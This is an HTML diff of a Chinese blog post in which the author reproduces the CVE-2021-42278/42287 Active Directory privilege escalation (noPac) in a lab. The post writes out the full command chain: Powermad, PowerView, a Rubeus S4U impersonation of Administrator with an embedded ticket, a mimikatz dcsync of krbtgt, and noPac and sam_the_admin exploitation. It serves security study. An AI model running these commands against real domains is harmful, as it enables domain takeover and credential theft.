@@ -296,7 +296,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.3k</span>
+              <span>4.4k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -316,104 +316,177 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</p>
-<p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
-<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
-<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>域内普通用户</p>
-<p><code>lab\user01 </code>  / <code>Test.123</code></p>
+        <h3 id="前言">前言</h3>
+<p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</p>
+<p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS
+Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS
+Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
+<h3 id="参考">参考</h3>
+<p>https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</p>
+<p>https://www.cnblogs.com/mrhonest/p/15682858.html</p>
+<p>https://heibai.org.cn/2071.html</p>
+<h3 id="环境">环境</h3>
+<p>域内普通用户</p>
+<p><code>lab\user01</code> / <code>Test.123</code></p>
 <p>Win2008</p>
 <p>Win2012</p>
-<h3 id="复现踩坑"><a href="#复现踩坑" class="headerlink" title="复现踩坑"></a><em>复现</em>踩坑</h3><h4 id="创建域用户hello"><a href="#创建域用户hello" class="headerlink" title="创建域用户hello"></a>创建域用户hello</h4><p>这里使用一个域内普通用户进行登录  下载Powermad.ps1</p>
+<h3 id="复现踩坑"><em>复现</em>踩坑</h3>
+<h4 id="创建域用户hello">创建域用户hello</h4>
+<p>这里使用一个域内普通用户进行登录 下载Powermad.ps1</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/1fd95242/1.png" alt="截图"></p>
-<p><img src="/posts/1fd95242/2.png" alt="截图"></p>
+<figure>
+<img src="/posts/1fd95242/1.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<figure>
+<img src="/posts/1fd95242/2.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>成功创建用户test</p>
-<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN=hello,CN=Computers,DC=lab,DC=com&quot;  -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>先用<code>setspn</code>查一下 </p>
+<h4 id="删除spn记录">删除spn记录</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN=hello,CN=Computers,DC=lab,DC=com&quot;  -Clear &#x27;serviceprincipalname&#x27; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先用<code>setspn</code>查一下</p>
 <p><code>setspn -Q */* | findstr hola</code></p>
-<p><img src="/posts/1fd95242/3.png" alt="截图"></p>
-<br>
-
-<p>这里 我另起了一个powershell去引用桌面上的cmd 结果会报错 ，然后把powerview放在Powermad同目录下导入就不报错了…. （不知道为啥…）</p>
-<p><img src="/posts/1fd95242/4.png" alt="截图"></p>
+<figure>
+<img src="/posts/1fd95242/3.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>这里 我另起了一个powershell去引用桌面上的cmd 结果会报错
+，然后把powerview放在Powermad同目录下导入就不报错了....
+（不知道为啥...）</p>
+<figure>
+<img src="/posts/1fd95242/4.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>移动后就正常了</p>
-<p><img src="/posts/1fd95242/5.png" alt="截图"></p>
-<p>(<del>在win2012powershell下 Set-DomainObject没有这个东西？？？！！！)…</del></p>
-<p>发现两个powerview.ps1 大小不一样 不是同一个 服了…… 一个700+K 一个300+K</p>
+<figure>
+<img src="/posts/1fd95242/5.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p>(<del>在win2012powershell下
+Set-DomainObject没有这个东西？？？！！！)...</del></p>
+<p>发现两个powerview.ps1 大小不一样 不是同一个 服了...... 一个700+K
+一个300+K</p>
 <p>然后去尝试删除spn 。。。</p>
-<p><img src="/posts/1fd95242/6.png" alt="截图"></p>
-<br>
-
-<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
-
+<figure>
+<img src="/posts/1fd95242/6.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="重设机器名">重设机器名</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
 <p>改为域控名</p>
-<p><img src="/posts/1fd95242/7.png" alt="截图"></p>
-<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错.......$#%@&amp;@!#@!…….</del></p>
-<p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0 然后去下载下来安装，结果安装超时了，这台机器的网络…</del></p>
+<figure>
+<img src="/posts/1fd95242/7.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h4 id="请求tgt">请求TGT</h4>
+<p><del>win2008下使用Rubeus.exe报错.......$#%@&amp;@!#@!.......</del></p>
+<p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0
+然后去下载下来安装，结果安装超时了，这台机器的网络...</del></p>
 <p>后面找了个 .net4.5免安装版就可用去使用Rebues。。。。</p>
-<br>
-
-<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建机器用户hello"><a href="#创建机器用户hello" class="headerlink" title="创建机器用户hello"></a>创建机器用户hello</h4><h4 id="删除spn记录-1"><a href="#删除spn记录-1" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><p><img src="/posts/1fd95242/8.png" alt="截图"></p>
-<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="重新设置机器名"><a href="#重新设置机器名" class="headerlink" title="重新设置机器名"></a>重新设置机器名</h4><p><img src="/posts/1fd95242/9.png" alt="截图"></p>
-<br>
-
-<h4 id="请求TGT-1"><a href="#请求TGT-1" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><img src="/posts/1fd95242/10.png" alt="截图"></p>
-<br>
-
-<h4 id="恢复原来的机器属性"><a href="#恢复原来的机器属性" class="headerlink" title="恢复原来的机器属性"></a>恢复原来的机器属性</h4><p><img src="/posts/1fd95242/11.png" alt="截图"></p>
-<br>
-
-<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:DC01.lab.com /self /altservice:LDAP/DC01.lab.com  /ptt /ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN/EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv/iZtG3rvGdHafJxyD3b/GfWSVLt3c1Ev7LGf9mUP/tDzsxQ46mDgdbUiuB5B7/z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa/wqAkIl9cmO7d/hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG/W/+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM/1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J/EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5/4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73/NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+/WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386/NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><del>这里不管使用cmd 还是powershell  命令太长了被分成了两个……？？？</del></p>
+<p><br></p>
+<h3 id="复现">复现</h3>
+<h4 id="创建机器用户hello">创建机器用户hello</h4>
+<h4 id="删除spn记录-1">删除spn记录</h4>
+<figure>
+<img src="/posts/1fd95242/8.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h4 id="section"></h4>
+<h4 id="重新设置机器名">重新设置机器名</h4>
+<figure>
+<img src="/posts/1fd95242/9.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="请求tgt-1">请求TGT</h4>
+<figure>
+<img src="/posts/1fd95242/10.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="恢复原来的机器属性">恢复原来的机器属性</h4>
+<figure>
+<img src="/posts/1fd95242/11.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="获取票据">获取票据</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /nowrap /dc:DC01.lab.com /self /altservice:LDAP/DC01.lab.com  /ptt /ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN/EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv/iZtG3rvGdHafJxyD3b/GfWSVLt3c1Ev7LGf9mUP/tDzsxQ46mDgdbUiuB5B7/z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa/wqAkIl9cmO7d/hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG/W/+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM/1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J/EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5/4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73/NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+/WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386/NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><del>这里不管使用cmd 还是powershell
+命令太长了被分成了两个......？？？</del></p>
 <p>额 居然是在复制时候 太长notepad给自己换行了</p>
-<p><img src="/posts/1fd95242/12.png" alt="截图"></p>
-<br>
-
-<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:lab\krbtgt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/posts/1fd95242/13.png" alt="截图"></p>
-<br>
-
-<h4 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h4><p><code>klist purge</code></p>
-<br>
-
-<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
-<p><a target="_blank" rel="noopener" href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
+<figure>
+<img src="/posts/1fd95242/12.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="获取krbtgt用户的ntlm-hash">获取krbtgt用户的NTLM Hash</h4>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /user:lab\krbtgt</span><br></pre></td></tr></table></figure>
+<figure>
+<img src="/posts/1fd95242/13.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<h4 id="清除票据">清除票据</h4>
+<p><code>klist purge</code></p>
+<p><br></p>
+<h3 id="nopac">noPac</h3>
+<p>https://github.com/cube0x0/noPac</p>
+<p>https://github.com/waterrr/noPac?ref=pythonawesome.com</p>
 <p>在win2008下 提示需要 .Net4.0 结果安装失败了..</p>
 <p>然后换win2012R2 的一台域机器去复现</p>
 <p>0x01 扫描探测</p>
-<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  （这里密码加’’会报错）</p>
-<p><img src="/posts/1fd95242/14.png" alt="截图"></p>
+<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>
+（这里密码加''会报错）</p>
+<figure>
+<img src="/posts/1fd95242/14.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
 <p>复现失败，可用创建用户，但是再</p>
-<p>然后尝试再这个普通域用户下去安装python 但是报错策略XX 失败  python安装也超时了 **@#￥@**@$@#</p>
-<p> 去尝试安装。net4.5  还是超时了 这个域环境是别人给我的  真***烂，PTT,PTK,PTH都实验不了 机器网也问题很大 能访问bing 别的访问不了….</p>
-<h4 id="踩完的后的利用。。。"><a href="#踩完的后的利用。。。" class="headerlink" title="踩完的后的利用。。。"></a>踩完的后的利用。。。</h4><h5 id="扫描探测"><a href="#扫描探测" class="headerlink" title="扫描探测"></a>扫描探测</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  这里密码处网上加的’’但是这里我加上就会报错 不加的话可正常使用</p>
-<p><img src="/posts/1fd95242/15.png" alt="截图"></p>
-<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
-<p><code>ls  \\DC01.lab.com\C$ </code></p>
-<p><img src="/posts/1fd95242/16.png" alt="截图"></p>
-<br>
-
-<p>还有个python版的noPac 但是这台机器上的python是离线安装的 pip还不知道怎么安 ┭┮﹏┭┮ 踩坑踩了一天终于能复现到了</p>
-<br>
-
-<h4 id="noPac（python）"><a href="#noPac（python）" class="headerlink" title="noPac（python）"></a>noPac（python）</h4><p> <a target="_blank" rel="noopener" href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
-<br>
-
-<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
-<p>Python 利用脚本：<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
-<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
-<p>这个还没尝试 <a target="_blank" rel="noopener" href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
-<br>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个洞复现踩了好多坑….用了一天的时间….</p>
-<p>由于测试机器使用的域内普通用户，在下载、安装上都会受到限制，然后选择采取使用离线安装的方式去下载相关版本，只下载了免安装的.net 4.6和 py3.7 但是py3的pip还没整上去，后续的exp脚本就没有测试。</p>
-<p>还有就是因为是在虚拟机上运行的，且是使用的域内普通用户，因此这个vmtools 无法直接从外面复制进来文件，而且在尝试直接使用python http服务去下载是 默认浏览器存在安全策略，而普通用户无法关闭，然后我去用administrator去关闭了IE安全策略后，还是存在安全策略，然后没法使用。只能通过在测试机器上去访问administrator目录下 从外面拖进来的所需要的文件</p>
+<p>然后尝试再这个普通域用户下去安装python 但是报错策略XX 失败
+python安装也超时了 **@#￥@**@$@#</p>
+<p>去尝试安装。net4.5 还是超时了 这个域环境是别人给我的
+真***烂，PTT,PTK,PTH都实验不了 机器网也问题很大 能访问bing
+别的访问不了....</p>
+<h4 id="踩完的后的利用">踩完的后的利用。。。</h4>
+<h5 id="扫描探测">扫描探测</h5>
+<p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>
+这里密码处网上加的''但是这里我加上就会报错 不加的话可正常使用</p>
+<figure>
+<img src="/posts/1fd95242/15.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<h5 id="利用">利用</h5>
+<p><code>./noPac.exe -domain attack.local -user oa -pass '!@#Qz123' /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
+<p><code>ls  \\DC01.lab.com\C$</code></p>
+<figure>
+<img src="/posts/1fd95242/16.png" alt="截图">
+<figcaption aria-hidden="true">截图</figcaption>
+</figure>
+<p><br></p>
+<p>还有个python版的noPac 但是这台机器上的python是离线安装的
+pip还不知道怎么安 ┭┮﹏┭┮ 踩坑踩了一天终于能复现到了</p>
+<p><br></p>
+<h4 id="nopacpython">noPac（python）</h4>
+<p>https://github.com/waterrr/noPac?ref=pythonawesome.com</p>
+<p><br></p>
+<h4 id="sam_the_admin">Sam_the_admin</h4>
+<p>CVE-2021-42287/CVE-2021-42278 Attack</p>
+<p>Python 利用脚本：https://github.com/WazeHell/sam-the-admin</p>
+<p><code>python3 sam_the_admin.py "redteam/saul:Red12345" -dc-ip 10.10.10.8 -shell</code></p>
+<p>这个还没尝试 https://heibai.org.cn/2071.html</p>
+<p><br></p>
+<h3 id="总结">总结</h3>
+<p>这个洞复现踩了好多坑....用了一天的时间....</p>
+<p>由于测试机器使用的域内普通用户，在下载、安装上都会受到限制，然后选择采取使用离线安装的方式去下载相关版本，只下载了免安装的.net
+4.6和 py3.7 但是py3的pip还没整上去，后续的exp脚本就没有测试。</p>
+<p>还有就是因为是在虚拟机上运行的，且是使用的域内普通用户，因此这个vmtools
+无法直接从外面复制进来文件，而且在尝试直接使用python http服务去下载是
+默认浏览器存在安全策略，而普通用户无法关闭，然后我去用administrator去关闭了IE安全策略后，还是存在安全策略，然后没法使用。只能通过在测试机器上去访问administrator目录下
+从外面拖进来的所需要的文件</p>
 
     </div>
 
@@ -544,7 +617,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91"><span class="nav-number">4.</span> <span class="nav-text">复现踩坑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%94%A8%E6%88%B7hello"><span class="nav-number">4.1.</span> <span class="nav-text">创建域用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E8%AE%BE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">4.3.</span> <span class="nav-text">重设机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82TGT"><span class="nav-number">4.4.</span> <span class="nav-text">请求TGT</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7hello"><span class="nav-number">5.1.</span> <span class="nav-text">创建机器用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95-1"><span class="nav-number">5.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E8%AE%BE%E7%BD%AE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">5.4.</span> <span class="nav-text">重新设置机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82TGT-1"><span class="nav-number">5.5.</span> <span class="nav-text">请求TGT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E5%8E%9F%E6%9D%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E5%B1%9E%E6%80%A7"><span class="nav-number">5.6.</span> <span class="nav-text">恢复原来的机器属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.7.</span> <span class="nav-text">获取票据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96krbtgt%E7%94%A8%E6%88%B7%E7%9A%84NTLM-Hash"><span class="nav-number">5.8.</span> <span class="nav-text">获取krbtgt用户的NTLM Hash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%B8%85%E9%99%A4%E7%A5%A8%E6%8D%AE"><span class="nav-number">5.9.</span> <span class="nav-text">清除票据</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#noPac"><span class="nav-number">6.</span> <span class="nav-text">noPac</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B8%A9%E5%AE%8C%E7%9A%84%E5%90%8E%E7%9A%84%E5%88%A9%E7%94%A8%E3%80%82%E3%80%82%E3%80%82"><span class="nav-number">6.1.</span> <span class="nav-text">踩完的后的利用。。。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E6%8E%A2%E6%B5%8B"><span class="nav-number">6.1.1.</span> <span class="nav-text">扫描探测</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.1.2.</span> <span class="nav-text">利用</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#noPac%EF%BC%88python%EF%BC%89"><span class="nav-number">6.2.</span> <span class="nav-text">noPac（python）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Sam-the-admin"><span class="nav-number">6.3.</span> <span class="nav-text">Sam_the_admin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">7.</span> <span class="nav-text">总结</span></a></li></ol></div>
